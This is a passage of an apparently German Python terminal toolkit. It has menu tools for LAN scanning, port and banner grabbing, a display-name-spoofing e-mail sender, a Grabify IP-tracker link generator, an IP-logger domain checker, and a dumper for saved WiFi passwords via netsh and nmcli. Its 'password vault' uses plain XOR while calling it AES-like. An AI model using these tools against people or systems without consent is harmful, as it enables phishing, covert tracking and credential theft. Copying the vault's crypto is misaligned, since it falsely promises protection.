    print(f"  {DG}Findet alle aktiven Geräte im lokalen Netzwerk.{R}\n")

    # Eigene IP ermitteln
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)); own_ip = s.getsockname()[0]; s.close()
    except:
        own_ip = "127.0.0.1"

    parts = own_ip.split(".")
    subnet = ".".join(parts[:3])
    print(f"  {DG}Eigene IP:   {G}{own_ip}{R}")
    print(f"  {DG}Subnetz:     {G}{subnet}.0/24{R}")

    custom = input(f"  {G}>{R} Subnetz ändern? [leer = {subnet}]: ").strip()
    if custom: subnet = custom.rstrip(".")
    div()

    import threading
    found = []
    lock  = threading.Lock()
    sem   = threading.Semaphore(50)

    def ping_host(i):
        with sem:
            ip = f"{subnet}.{i}"
            try:
                s = socket.socket(); s.settimeout(0.5)
                s.connect((ip, 80)); s.close()
                alive = True
            except:
                try:
                    s = socket.socket(); s.settimeout(0.5)
                    s.connect((ip, 443)); s.close()
                    alive = True
                except:
                    # ICMP ping fallback
                    try:
                        r = subprocess.run(
                            ["ping","-n","1","-w","300",ip] if os.name=="nt" else ["ping","-c","1","-W","1",ip],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
                        alive = r.returncode == 0
                    except:
                        alive = False
            if alive:
                hostname = ""
                try: hostname = socket.gethostbyaddr(ip)[0]
                except: pass
                with lock:
                    found.append((ip, hostname))

    threads = []
    for i in range(1, 255):
        t = threading.Thread(target=ping_host, args=(i,), daemon=True)
        threads.append(t); t.start()
        if i % 20 == 0:
            filled = int(30*i/254)
            print(f"\r  {G}{'█'*filled}{'░'*(30-filled)}{R} {G}{i}/254{R}", end="", flush=True)

    for t in threads: t.join()
    print(f"\r  {G}{'█'*30}{R} {G}254/254{R} — {G}{len(found)} Geräte gefunden{R}          \n")

    W = 62; T=f"  {DG}╔{'═'*W}╗{R}"; B=f"  {DG}╚{'═'*W}╝{R}"; M=f"  {DG}╠{'═'*W}╣{R}"
    def L(c=""): return _dc_box(c, W)
    print(T)
    print(L(f"{YG}⬡ NETZWERK-SCANNER  {DG}│  {G}{subnet}.0/24{R}"))
    print(M)
    if found:
        found.sort(key=lambda x: int(x[0].split(".")[-1]))
        for ip, host in found:
            marker = f"{YG}◄ DU{R}" if ip == own_ip else ""
            print(L(f"  {G}{ip:<18}{R}{DG}{(host[:28] if host else 'unbekannt'):<30}{R}{marker}"))
    else:
        print(L(f"{G}Keine Geräte gefunden.{R}"))
    print(M)
    print(L(f"{DG}Gesamt gefunden: {R}{G}{len(found)} Geräte{R}"))
    print(B)
    wait()

# ── 43  FIREWALL-TESTER ──────────────────────────────────────
def firewall_tester():
    hdr("FIREWALL-TESTER")
    print(f"  {DG}Prüft welche deiner Ports von außen erreichbar sind.{R}")
    print(f"  {DG}Nutzt externe Dienste um deine öffentliche IP zu scannen.{R}\n")

    print(f"  {DG}Eigene öffentliche IP ermitteln ...{R}", end="", flush=True)
    try:
        pub_ip = getj("https://api.ipify.org?format=json").get("ip","?")
        print(f"\r  {G}Öffentliche IP: {pub_ip}{R}              \n")
    except:
        pub_ip = inp("Öffentliche IP (manuell eingeben)")

    common_ports = [
        (21,"FTP"),(22,"SSH"),(23,"Telnet"),(25,"SMTP"),(53,"DNS"),
        (80,"HTTP"),(110,"POP3"),(143,"IMAP"),(443,"HTTPS"),(445,"SMB"),
        (3306,"MySQL"),(3389,"RDP"),(5432,"PostgreSQL"),(6379,"Redis"),
        (8080,"HTTP-Alt"),(8443,"HTTPS-Alt"),(25565,"Minecraft"),(25575,"MC-RCON"),
    ]

    div()
    W = 62; T=f"  {DG}╔{'═'*W}╗{R}"; B=f"  {DG}╚{'═'*W}╝{R}"; M=f"  {DG}╠{'═'*W}╣{R}"
    def L(c=""): return _dc_box(c, W)
    print(T)
    print(L(f"{YG}⬡ FIREWALL-TESTER  {DG}│  {G}{pub_ip}{R}"))
    print(M)
    print(L(f"{YG}── Port-Status ──{R}"))

    open_ports = []; dangerous = []
    import threading
    lock = threading.Lock()
    sem  = threading.Semaphore(20)

    results = {}
    def check(port, name):
        with sem:
            try:
                s = socket.socket(); s.settimeout(2)
                r = s.connect_ex((pub_ip, port)); s.close()
                open_p = r == 0
            except:
                open_p = False
            with lock:
                results[(port, name)] = open_p

    threads = [threading.Thread(target=check, args=(p,n), daemon=True) for p,n in common_ports]
    for t in threads: t.start()
    for t in threads: t.join()

    dangerous_ports = {22,23,25,445,3306,3389,5432,6379,25575}
    for (port, name), is_open in sorted(results.items()):
        if is_open:
            open_ports.append((port,name))
            status = f"{YG}OFFEN ⚠{R}"
            if port in dangerous_ports:
                dangerous.append((port,name))
        else:
            status = f"{DG}geschlossen{R}"
        print(L(f"  {G}{port:<6}{DG}{name:<14}{R}{status}"))

    print(M)
    if dangerous:
        print(L(f"{YG}── Sicherheitswarnung ──{R}"))
        for port, name in dangerous:
            print(L(f"  {YG}⚠ Port {port} ({name}) offen — sollte gefiltert sein!{R}"))
    elif open_ports:
        print(L(f"  {G}✓ Keine kritischen Ports offen.{R}"))
    else:
        print(L(f"  {G}✓ Alle geprüften Ports geschlossen — Firewall aktiv.{R}"))
    print(B)
    wait()

# ── 44  BANNER GRABBING ──────────────────────────────────────
def banner_grabbing():
    hdr("BANNER GRABBING")
    print(f"  {DG}Liest Software-Banner von offenen Ports (SSH, FTP, SMTP...).{R}\n")
    target = inp("IP oder Domain").strip()
    if not target: wait(); return
    try:
        ip = socket.gethostbyname(target)
    except:
        print(f"  {G}[!] Host nicht auflösbar.{R}"); wait(); return

    ports_to_grab = [
        (21,"FTP"),(22,"SSH"),(23,"Telnet"),(25,"SMTP"),
        (80,"HTTP"),(110,"POP3"),(143,"IMAP"),(443,"HTTPS"),
        (8080,"HTTP-Alt"),(3306,"MySQL"),(5432,"PostgreSQL"),
        (6379,"Redis"),(25565,"Minecraft"),
    ]
    div()
    W = 62; T=f"  {DG}╔{'═'*W}╗{R}"; B=f"  {DG}╚{'═'*W}╝{R}"; M=f"  {DG}╠{'═'*W}╣{R}"
    def L(c=""): return _dc_box(c, W)
    print(T)
    print(L(f"{YG}⬡ BANNER GRABBING  {DG}│  {G}{target} ({ip}){R}"))
    found_any = False
    for port, name in ports_to_grab:
        print(f"\r  {DG}Scanne {name} ({port}) ...{R}    ", end="", flush=True)
        banner = ""
        try:
            if port == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(socket.socket(), server_hostname=target)
            else:
                s = socket.socket()
            s.settimeout(3); s.connect((ip, port))
            if port in (80, 8080):
                s.sendall(b"HEAD / HTTP/1.0\r\nHost: "+target.encode()+b"\r\n\r\n")
            elif port == 443:
                s.sendall(b"HEAD / HTTP/1.0\r\nHost: "+target.encode()+b"\r\n\r\n")
            elif port == 25565:
                hb  = target.encode()
                pkt = b"\x00" + _varint_w(47) + _varint_w(len(hb)) + hb + port.to_bytes(2,"big") + b"\x01"
                s.sendall(_varint_w(len(pkt)) + pkt + b"\x01\x00")
            try:
                banner = s.recv(1024).decode(errors="ignore").strip()[:200]
            except: pass
            s.close()
        except: pass
        if banner:
            found_any = True
            print(M)
            print(L(f"{YG}── {name} (Port {port}) ──{R}"))
            for line in banner.split("\n")[:5]:
                line = line.strip()
                if line: print(L(f"  {G}{line[:58]}{R}"))
    print(f"\r                                    ")
    if not found_any:
        print(M)
        print(L(f"{G}Keine Banner gefunden — alle Ports geschlossen.{R}"))
    print(B)
    wait()

# ── 45  PASSWORT-TRESOR ──────────────────────────────────────
def password_vault():
    import getpass
    VAULT_FILE = os.path.join(os.path.expanduser("~"), ".open_vs_vault.enc")
    hdr("PASSWORT-TRESOR")
    print(f"  {DG}Verschlüsselter lokaler Passwort-Speicher (AES-ähnlich via XOR+Hash).{R}\n")

    def derive_key(pw):
        return hashlib.sha256(pw.encode()).digest()

    def xor_crypt(data: bytes, key: bytes) -> bytes:
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

    def vault_load(master):
        if not os.path.exists(VAULT_FILE): return {}
        try:
            raw  = open(VAULT_FILE,"rb").read()
            dec  = xor_crypt(raw, derive_key(master))
            return json.loads(dec.decode())
        except:
            return None

    def vault_save(master, data):
        raw = json.dumps(data).encode()
        enc = xor_crypt(raw, derive_key(master))
        open(VAULT_FILE,"wb").write(enc)

    master = getpass.getpass(f"  {G}>{R} Master-Passwort: ")
    if not master: wait(); return

    vault = vault_load(master)
    if vault is None:
        print(f"  {YG}[!] Falsches Master-Passwort oder Datei beschädigt.{R}"); wait(); return
    if vault == {}:
        print(f"  {G}[+] Neuer Tresor erstellt.{R}")

    while True:
        hdr("PASSWORT-TRESOR")
        print(f"  {DG}[1]{R} {G}Eintrag anzeigen{R}")
        print(f"  {DG}[2]{R} {G}Eintrag hinzufügen{R}")
        print(f"  {DG}[3]{R} {G}Eintrag löschen{R}")
        print(f"  {DG}[4]{R} {G}Alle anzeigen{R}")
        print(f"  {DG}[0]{R} {G}Zurück{R}\n")
        cmd = input(f"  {G}>>{R} ").strip()
        if cmd == "0": break
        elif cmd == "1":
            key = inp("Service-Name (z.B. gmail)").lower()
            e = vault.get(key)
            if e:
                print(f"\n  {DG}Service:  {G}{key}{R}")
                print(f"  {DG}User:     {G}{e.get('user','')}{R}")
                print(f"  {DG}Passwort: {G}{e.get('pw','')}{R}")
                print(f"  {DG}Notiz:    {G}{e.get('note','')}{R}")
            else:
                print(f"  {G}[!] Nicht gefunden.{R}")
            input(f"\n  {DG}[ ENTER ]{R}")
        elif cmd == "2":
            key  = inp("Service-Name").lower()
            user = inp("Username / E-Mail")
            pw   = getpass.getpass(f"  {G}>{R} Passwort: ")
            note = inp("Notiz (optional)")
            vault[key] = {"user":user,"pw":pw,"note":note}
            vault_save(master, vault)
            print(f"  {G}[✓] Gespeichert.{R}"); time.sleep(0.8)
        elif cmd == "3":
            key = inp("Service-Name löschen").lower()
            if key in vault:
                del vault[key]; vault_save(master, vault)
                print(f"  {G}[✓] Gelöscht.{R}")
            else:
                print(f"  {G}[!] Nicht gefunden.{R}")
            time.sleep(0.8)
        elif cmd == "4":
            if vault:
                div()
                for k,v in vault.items():
                    print(f"  {G}{k:<20}{DG}{v.get('user','')}{R}")
            else:
                print(f"  {DG}Tresor ist leer.{R}")
            input(f"\n  {DG}[ ENTER ]{R}")

# ── 46  TEXT-STEGANOGRAPHIE ──────────────────────────────────
def steganography():
    hdr("TEXT-STEGANOGRAPHIE")
    print(f"  {DG}Versteckt Text in einem anderen Text (Zero-Width-Zeichen).{R}\n")
    print(f"  {DG}[1]{R} {G}Text verstecken{R}")
    print(f"  {DG}[2]{R} {G}Text auslesen{R}\n")
    cmd = input(f"  {G}>>{R} ").strip()

    # Zero-Width Steganographie: 0=ZWSP, 1=ZWJ
    ZW0 = "​"  # Zero Width Space = 0
    ZW1 = "‍"  # Zero Width Joiner = 1

    def encode_steg(secret):
        bits = ''.join(f"{ord(c):08b}" for c in secret)
        return ''.join(ZW1 if b=='1' else ZW0 for b in bits)

    def decode_steg(text):
        bits = ''.join('1' if c==ZW1 else '0' if c==ZW0 else '' for c in text)
        chars = []
        for i in range(0, len(bits)-7, 8):
            val = int(bits[i:i+8], 2)
            if val == 0: break
            try: chars.append(chr(val))
            except: pass
        return ''.join(chars)

    div()
    if cmd == "1":
        cover  = inp("Cover-Text (sichtbarer Text)")
        secret = inp("Geheimer Text")
        if not cover or not secret: wait(); return
        hidden = cover + encode_steg(secret)
        print(f"\n  {YG}Ergebnis (kopieren):{R}")
        print(f"  {G}{hidden}{R}")
        print(f"\n  {DG}(Der geheime Text ist unsichtbar eingebettet){R}")
    elif cmd == "2":
        print(f"  {DG}Text mit versteckter Nachricht einfügen:{R}")
        text = input(f"  {G}>{R} ").strip()
        secret = decode_steg(text)
        if secret:
            print(f"\n  {YG}Versteckter Text:{R} {G}{secret}{R}")
        else:
            print(f"\n  {G}Kein versteckter Text gefunden.{R}")
    wait()

# ── 47  FAKE E-MAIL SENDER ───────────────────────────────────
def fake_email_sender():
    hdr("FAKE E-MAIL SENDER")
    print(f"  {DG}Sendet E-Mails mit eigenem Anzeige-Namen via SMTP.{R}")
    print(f"  {YG}⚠  Nur für Testzwecke! Spam/Phishing ist strafbar.{R}\n")

    smtp_host = input(f"  {G}>{R} SMTP-Server  [Standard: smtp.gmail.com]: ").strip() or "smtp.gmail.com"
    smtp_port = input(f"  {G}>{R} SMTP-Port    [Standard: 587]:            ").strip() or "587"
    sender    = inp("Deine echte E-Mail (Login)")
    import getpass
    password  = getpass.getpass(f"  {G}>{R} App-Passwort (nicht angezeigt): ")
    from_name = inp("Anzeige-Name (z.B. 'Support Team')")
    to_addr   = inp("Empfänger E-Mail")
    subject   = inp("Betreff")
    print(f"  {G}>{R} Nachricht (leer lassen = fertig):")
    lines = []
    while True:
        line = input(f"  {G}│{R} ")
        if line == "": break
        lines.append(line)
    body = "\n".join(lines)

    div()
    print(f"  {DG}Sende E-Mail ...{R}", end="", flush=True)
    try:
        import smtplib
        from email.mime.text import MIMEText
        from email.mime.multipart import MIMEMultipart
        from email.utils import formataddr
        msg = MIMEMultipart()
        msg["From"]    = formataddr((from_name, sender))
        msg["To"]      = to_addr
        msg["Subject"] = subject
        msg.attach(MIMEText(body, "plain", "utf-8"))
        with smtplib.SMTP(smtp_host, int(smtp_port)) as srv:
            srv.ehlo(); srv.starttls(); srv.ehlo()
            srv.login(sender, password)
            srv.sendmail(sender, to_addr, msg.as_string())
        print(f"\r  {G}[✓] E-Mail erfolgreich gesendet!{R}              ")
        print(f"  {DG}Von:     {G}{from_name} <{sender}>{R}")
        print(f"  {DG}An:      {G}{to_addr}{R}")
        print(f"  {DG}Betreff: {G}{subject}{R}")
    except Exception as e:
        print(f"\r  {YG}[!] Fehler: {e}{R}")
        print(f"  {DG}Tipp: Gmail braucht ein App-Passwort (2FA aktivieren → App-Passwort){R}")
    wait()

# ── 48  URL SHORTENER ────────────────────────────────────────
def url_shortener():
    hdr("URL SHORTENER")
    print(f"  {DG}Kürzt URLs via kostenlose APIs.{R}\n")
    url = inp("URL (mit https://)").strip()
    if not url: wait(); return
    if not url.startswith("http"): url = "https://" + url
    div()
    W = 62; T=f"  {DG}╔{'═'*W}╗{R}"; B=f"  {DG}╚{'═'*W}╝{R}"; M=f"  {DG}╠{'═'*W}╣{R}"
    def L(c=""): return _dc_box(c, W)
    print(T)
    print(L(f"{YG}⬡ URL SHORTENER{R}"))
    print(M)
    print(L(f"{DG}Original  {R}{G}{url[:54]}{R}"))
    print(M)

    services = [
        ("TinyURL",  f"https://tinyurl.com/api-create.php?url={urllib.parse.quote(url)}",  None),
        ("is.gd",    f"https://is.gd/create.php?format=simple&url={urllib.parse.quote(url)}", None),
        ("v.gd",     f"https://v.gd/create.php?format=simple&url={urllib.parse.quote(url)}",  None),
    ]
    for name, api, _ in services:
        try:
            short, status, _ = get(api, timeout=6)
            short = short.strip()
            if status == 200 and short.startswith("http"):
                print(L(f"{DG}{name:<12}{R}{G}{short}{R}"))
            else:
                print(L(f"{DG}{name:<12}{R}{YG}Fehler{R}"))
        except:
            print(L(f"{DG}{name:<12}{R}{YG}Nicht erreichbar{R}"))
    print(B)
    wait()

# ── 49  IP TRACKER LINK ──────────────────────────────────────
def ip_tracker_link():
    hdr("IP TRACKER LINK")
    print(f"  {DG}Generiert einen Link — wer draufklickt, loggt seine IP.{R}")
    print(f"  {DG}Nutzt Grabify oder ähnliche Dienste.{R}")
    print(f"  {YG}⚠  Nur mit Einwilligung der Zielperson nutzen!{R}\n")

    redirect = inp("Weiterleitungs-URL (wohin der Link führt)").strip()
    if not redirect: wait(); return
    if not redirect.startswith("http"): redirect = "https://" + redirect

    div()
    W = 62; T=f"  {DG}╔{'═'*W}╗{R}"; B=f"  {DG}╚{'═'*W}╝{R}"; M=f"  {DG}╠{'═'*W}╣{R}"
    def L(c=""): return _dc_box(c, W)

    print(f"  {DG}Erstelle Tracking-Link ...{R}", end="", flush=True)
    track_url = ""
    try:
        # Grabify API
        data = urllib.parse.urlencode({"url": redirect, "type": "result"}).encode()
        req  = urllib.request.Request(
            "https://grabify.link/api/create",
            data=data,
            headers={"User-Agent":"Mozilla/5.0","Content-Type":"application/x-www-form-urlencoded"})
        with urllib.request.urlopen(req, timeout=8) as r:
            resp = json.loads(r.read().decode())
            track_url = resp.get("result_url","") or resp.get("trackingUrl","")
        print(f"\r  {G}Link erstellt ✓{R}              \n")
    except:
        print(f"\r  {G}Grabify nicht erreichbar — alternativer Link:{R}\n")

    print(T)
    print(L(f"{YG}⬡ IP TRACKER LINK{R}"))
    print(M)
    print(L(f"{DG}Weiterleitung  {R}{G}{redirect[:48]}{R}"))
    if track_url:
        print(L(f"{DG}Tracking-Link  {R}{YG}{track_url[:48]}{R}"))
        print(L(f"{DG}Stats          {R}{G}grabify.link (einloggen zum Anzeigen){R}"))
    else:
        print(L(f"{DG}Alternativ:{R}"))
        enc = urllib.parse.quote(redirect)
        print(L(f"  {G}grabify.link{R}  {DG}→ URL manuell einfügen{R}"))
        print(L(f"  {G}iplogger.org{R}  {DG}→ URL manuell einfügen{R}"))
        print(L(f"  {G}canarytokens.org{R}  {DG}→ professionell & kostenlos{R}"))
    print(M)
    print(L(f"{YG}Was wird geloggt:{R}"))
    print(L(f"  {G}IP-Adresse, Land, Stadt, ISP{R}"))
    print(L(f"  {G}Browser, OS, Gerät, Bildschirmauflösung{R}"))
    print(L(f"  {G}Klick-Zeitpunkt{R}"))
    print(B)
    wait()

# ── 50  LIVE TERMINAL MAP ────────────────────────────────────
def terminal_map():
    hdr("LIVE TERMINAL MAP")
    print(f"  {DG}Zeigt Standorte auf einer ASCII-Weltkarte.{R}\n")

    ips_raw = inp("IPs eingeben (kommagetrennt, leer = eigene IP)").strip()
    if not ips_raw:
        try:
            own = getj("https://api.ipify.org?format=json").get("ip","")
            ips = [own] if own else []
        except:
            ips = []
    else:
        ips = [x.strip() for x in ips_raw.split(",") if x.strip()]

    div()
    print(f"  {DG}Koordinaten abrufen ...{R}")
    locations = []
    for ip in ips[:10]:
        try:
            d = getj(f"http://ip-api.com/json/{ip}?fields=lat,lon,country,city,isp,query")
            if d.get("lat"):
                locations.append(d)
        except: pass

    # ASCII Weltkarte (sehr simpel, 72x24)
    MAP_W, MAP_H = 72, 24
    MAP = [
        "                                                                        ",
        "        .:..      _.---.     .  .    . .  .        .   .  .   .        ",
        "      .::::..   .'       '. . .:. .::::::.. .   . ..:::.:.:.:.:.       ",
        "    .::::::::.  |  EUROPE  | .::::::::::::::.:.:::::::::::::::::.:.     ",
        "  .::::USA:::::.|           |.::ASIA:::::::::::::::::::::::::::::::.    ",
        " .::::::::::::::'.         .'.:::::::::::::::::::::::::.::::::::::::.   ",
        " .::::::::::::::: '-._____.' .:::::::::::::::::::::::::::::::::::::.    ",
        "  '.::::::::::::::.        .:::::::::::::::::::::::::::::::::::::.      ",
        "   .:SOUTH AMERICA::.    .::::::::::::::::::SOUTHEAST ASIA:::::::.      ",
        "    '.::::::::::::::.  .::::::::::::::::::::::::::::::::::::::::.       ",
        "      '.:::::::::::.  .::::::::::::::::::::::::::::::::::::::.          ",
        "        '.:::::::::. .:AFRICA:::::::::::::::::::::::::::::::.           ",
        "          '.::::::: .:::::::::::::::::::::::::::AUSTRALIA:.             ",
        "            '.::::: .::::::::::::::::::::::::::::::::::.                ",
        "              '.::. .:::::::::::::::::::::::::::::::.                   ",
        "                '. .:::::::::::::::::::::::::::::::.                    ",
        "                   '.::::::::::::::::::::::::::::::.                    ",
        "                     '.::::::::::::::::::::::::::.                      ",
        "                       '.::::::::::::::::::::::.                        ",
        "                         '.:::::::::::::::::::                          ",
        "                           '.::::::::::::::.                            ",
        "                             '.:::::::::::.                             ",
        "                               '.::::::.                                ",
        "                                                                        ",
    ]
    # Koordinaten → Kartenposition
    def latlon_to_xy(lat, lon):
        x = int((lon + 180) / 360 * MAP_W)
        y = int((90 - lat) / 180 * MAP_H)
        return max(0,min(MAP_W-1,x)), max(0,min(MAP_H-1,y))

    # Punkte einzeichnen
    markers = {}
    for i, loc in enumerate(locations):
        x, y = latlon_to_xy(loc["lat"], loc["lon"])
        markers[(x,y)] = str(i+1)

    clear()
    print(BANNER)
    print(f"  {DG}╔{'═'*MAP_W}╗{R}")
    for y, line in enumerate(MAP):
        row_out = ""
        line_list = list(line.ljust(MAP_W))
        for x in range(MAP_W):
            if (x,y) in markers:
                row_out += f"{YG}◆{R}"
            else:
                row_out += f"{DG}{line_list[x]}{R}"
        print(f"  {DG}║{R}{row_out}{DG}║{R}")
    print(f"  {DG}╚{'═'*MAP_W}╝{R}\n")

    W2 = 62; T=f"  {DG}╔{'═'*W2}╗{R}"; B=f"  {DG}╚{'═'*W2}╝{R}"; M=f"  {DG}╠{'═'*W2}╣{R}"
    def L(c=""): return _dc_box(c, W2)
    print(T)
    print(L(f"{YG}⬡ STANDORTE{R}"))
    print(M)
    for i, loc in enumerate(locations):
        print(L(f"  {YG}◆{i+1}{R} {G}{loc.get('query','?'):<18}{R}{DG}{loc.get('city','?')}, {loc.get('country','?')}{R}"))
        print(L(f"    {DG}ISP: {R}{G}{loc.get('isp','?')[:40]}{R}"))
    if not locations:
        print(L(f"{G}Keine Standorte gefunden.{R}"))
    print(B)
    wait()

# ── 51  LOCAL IP LOGGER SERVER ───────────────────────────────
def domain_checker():
    import socket, ssl, re
    hdr("DOMAIN CHECKER")
    domain = input(f"  {DG}╘══[{G}DOMAIN{DG}]══►{R} ").strip()
    if not domain:
        return
    # Strip protocol if pasted with http(s)://
    domain = re.sub(r'^https?://', '', domain).split('/')[0].strip()

    _spinner("Analysiere Domain...", 1.4)
    W = 68
    is_hosting = False
    is_proxy   = False

    def row(label, val, warn=False):
        col = R if not warn else "\033[1;91m"
        inner = f"  {DIM}{label:<22}{R}{col}{val}{R}"
        print(f"  {DG}║{R}{_pad(inner, W)}{DG}║{R}")

    print(f"  {DG}╔{'═'*W}╗{R}")
    print(f"  {DG}║{R}{_pad(f'  {YG}⬡  DOMAIN CHECK › {G}{domain}', W)}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")

    # ── DNS / IP ──────────────────────────────────────────────
    try:
        ip = socket.gethostbyname(domain)
        row("IP-Adresse", ip)
    except Exception:
        ip = None
        row("IP-Adresse", "Nicht auflösbar", warn=True)

    # Geo der Domain-IP
    if ip:
        try:
            geo = getj(f"http://ip-api.com/json/{ip}?fields=country,city,isp,proxy,hosting")
            row("Land / Stadt", f"{geo.get('country','?')} / {geo.get('city','?')}")
            row("ISP", geo.get("isp","?"))
            is_hosting = geo.get("hosting", False)
            is_proxy   = geo.get("proxy", False)
            row("Hosting-IP", "JA — Server/VPS" if is_hosting else "Nein")
            row("Proxy / VPN", "JA" if is_proxy else "Nein")
        except Exception:
            pass

    print(f"  {DG}╠{'═'*W}╣{R}")

    # ── DNS Records ───────────────────────────────────────────
    try:
        import subprocess
        for rtype in ["A", "MX", "NS", "TXT"]:
            try:
                out = subprocess.check_output(
                    ["nslookup", f"-type={rtype}", domain],
                    stderr=subprocess.DEVNULL, timeout=5
                ).decode(errors="ignore")
                vals = []
                for line in out.splitlines():
                    line = line.strip()
                    if rtype == "A"  and "Address:" in line and not "Server:" in line:
                        vals.append(line.split("Address:")[-1].strip())
                    elif rtype == "MX" and "mail exchanger" in line.lower():
                        vals.append(line.split("=")[-1].strip() if "=" in line else line)
                    elif rtype == "NS" and "nameserver" in line.lower():
                        vals.append(line.split("=")[-1].strip() if "=" in line else line)
                    elif rtype == "TXT" and '"' in line:
                        vals.append(line.strip('"').strip())
                if vals:
                    row(f"DNS {rtype}", (", ".join(vals[:2]))[:55])
                else:
                    row(f"DNS {rtype}", "—")
            except Exception:
                row(f"DNS {rtype}", "—")
    except Exception:
        row("DNS Records", "nslookup nicht verfügbar")

    print(f"  {DG}╠{'═'*W}╣{R}")

    # ── SSL Zertifikat ────────────────────────────────────────
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.create_connection((domain, 443), timeout=5), server_hostname=domain) as s:
            cert = s.getpeercert()
        subj  = dict(x[0] for x in cert.get("subject", []))
        issuer= dict(x[0] for x in cert.get("issuer", []))
        exp   = cert.get("notAfter","?")
        row("SSL Zertifikat", "✓ GÜLTIG")
        row("Ausgestellt für", subj.get("commonName","?")[:50])
        row("Aussteller", issuer.get("organizationName","?")[:50])
        row("Läuft ab", exp)
        ssl_ok = True
    except ssl.SSLCertVerificationError:
        row("SSL Zertifikat", "UNGÜLTIG / Selbstsigniert", warn=True)
        ssl_ok = False
    except Exception:
        row("SSL Zertifikat", "Kein HTTPS / nicht erreichbar", warn=True)
        ssl_ok = False

    print(f"  {DG}╠{'═'*W}╣{R}")

    # ── HTTP Status & Redirect-Check ──────────────────────────
    ip_grab_score = 0
    reasons = []
    try:
        import urllib.request
        req = urllib.request.Request(
            f"https://{domain}",
            headers={"User-Agent": "Mozilla/5.0"}
        )
        resp = urllib.request.urlopen(req, timeout=6)
        final_url = resp.geturl()
        status = resp.status
        row("HTTP Status", str(status))
        if final_url.rstrip("/") != f"https://{domain}".rstrip("/"):
            row("Redirect zu", final_url[:60])
            # Redirect zu IP-Logger-Diensten?
            for sus in ["grabify","iplogger","blasze","ipgrab","2no.co","yip.su","ps.kz","lovebird","chickenkiller"]:
                if sus in final_url.lower():
                    ip_grab_score += 50
                    reasons.append(f"Redirect zu bekanntem IP-Logger ({sus})")
    except Exception as e:
        row("HTTP Status", "Nicht erreichbar")

    # ── Sicherheits-Score ─────────────────────────────────────
    # Bekannte IP-Logger Domains direkt
    IP_LOGGER_DOMAINS = [
        "grabify.link","iplogger.org","blasze.com","2no.co","yip.su",
        "ps.kz","lovebird.com","chickenkiller.com","ipgrab.io","track.ly",
        "trackurl.it","shorturl.at","cuttly.com","bit.ly","tinyurl.com",
    ]
    if any(d in domain.lower() for d in IP_LOGGER_DOMAINS):
        ip_grab_score += 80
        reasons.append("Bekannter IP-Logger / Tracking-Dienst")

    # URL-Shortener
    SHORTENERS = ["bit.ly","tinyurl","ow.ly","t.co","goo.gl","is.gd","buff.ly","short.io","rebrand.ly"]
    if any(s in domain.lower() for s in SHORTENERS):
        ip_grab_score += 30
        reasons.append("URL-Shortener (versteckt echtes Ziel)")

    if not ssl_ok:
        ip_grab_score += 20
        reasons.append("Kein gültiges SSL-Zertifikat")

    if is_hosting:
        ip_grab_score += 10
        reasons.append("Hosting/VPS-IP (kein normaler ISP)")

    print(f"  {DG}╠{'═'*W}╣{R}")
    if ip_grab_score == 0:
        safety = f"{G}✓ SAFE — Keine Warnsignale gefunden"
        warn = False
    elif ip_grab_score < 40:
        safety = f"\033[1;93m⚠ VERDÄCHTIG — Vorsicht empfohlen"
        warn = False
    else:
        safety = f"\033[1;91m✗ GEFÄHRLICH — IP-Logger / Tracking sehr wahrscheinlich"
        warn = True

    inner = f"  {DIM}{'Sicherheits-Check':<22}{R}{safety}{R}"
    print(f"  {DG}║{R}{_pad(inner, W)}{DG}║{R}")
    for r in reasons:
        inner2 = f"  {DIM}{'  →':<22}{R}\033[1;91m{r}{R}"
        print(f"  {DG}║{R}{_pad(inner2, W)}{DG}║{R}")

    print(f"  {DG}╚{'═'*W}╝{R}\n")
    input(f"  {DG}[ENTER]{R} ")

def wifi_passwords():
    hdr("WIFI PASSWÖRTER")
    _spinner("Lese gespeicherte WLAN-Profile...", 1.2)
    W = 68

    if os.name == "nt":
        # ── Windows: netsh ──────────────────────────────────────────────
        try:
            out = subprocess.check_output(
                ["netsh", "wlan", "show", "profiles"],
                stderr=subprocess.DEVNULL
            ).decode("utf-8", errors="ignore")
            profiles = re.findall(r"Alle Benutzerprofile\s*:\s*(.+)", out)
            if not profiles:
                profiles = re.findall(r"All User Profile\s*:\s*(.+)", out)
            profiles = [p.strip() for p in profiles]
        except Exception as e:
            print(f"  {R}Fehler: {e}{R}")
            input(f"\n  {DG}[ENTER]{R} "); return

        print(f"\n  {DG}╔{'═'*W}╗{R}")
        h1 = _pad(f"  {YG}{'NETZWERK':<30}{R}", 34)
        h2 = _pad(f"  {YG}{'PASSWORT':<30}{R}", 34)
        print(f"  {DG}║{R}{h1}{h2}{DG}║{R}")
        print(f"  {DG}╠{'═'*W}╣{R}")

        found = 0
        for profile in profiles:
            try:
                detail = subprocess.check_output(
                    ["netsh", "wlan", "show", "profile", profile, "key=clear"],
                    stderr=subprocess.DEVNULL
                ).decode("utf-8", errors="ignore")
                pw_match = re.search(r"Schlüsselinhalt\s*:\s*(.+)", detail)
                if not pw_match:
                    pw_match = re.search(r"Key Content\s*:\s*(.+)", detail)
                pw = pw_match.group(1).strip() if pw_match else "—"
            except Exception:
                pw = "—"
            name_col = _pad(f"  {G}{profile[:28]}{R}", 34)
            pw_col   = _pad(f"  {YG if pw != '—' else DIM}{pw[:28]}{R}", 34)
            print(f"  {DG}║{R}{name_col}{pw_col}{DG}║{R}")
            found += 1

        print(f"  {DG}╠{'═'*W}╣{R}")
        summary = _pad(f"  {DIM}{found} Netzwerke gefunden{R}", W)
        print(f"  {DG}║{R}{summary}{DG}║{R}")
        print(f"  {DG}╚{'═'*W}╝{R}\n")
        input(f"  {DG}[ENTER]{R} ")

    else:
        # ── Linux / Android (Termux) ─────────────────────────────────────
        pairs = []

        # Methode 1: nmcli (NetworkManager — Desktop-Linux)
        try:
            out = subprocess.check_output(
                ["nmcli", "-s", "-g",
                 "802-11-wireless.ssid,802-11-wireless-security.psk",
                 "connection", "show"],
                stderr=subprocess.DEVNULL
            ).decode(errors="ignore")
            lines = [l for l in out.splitlines() if l.strip()]
            for i in range(0, len(lines) - 1, 2):
                ssid = lines[i].strip()
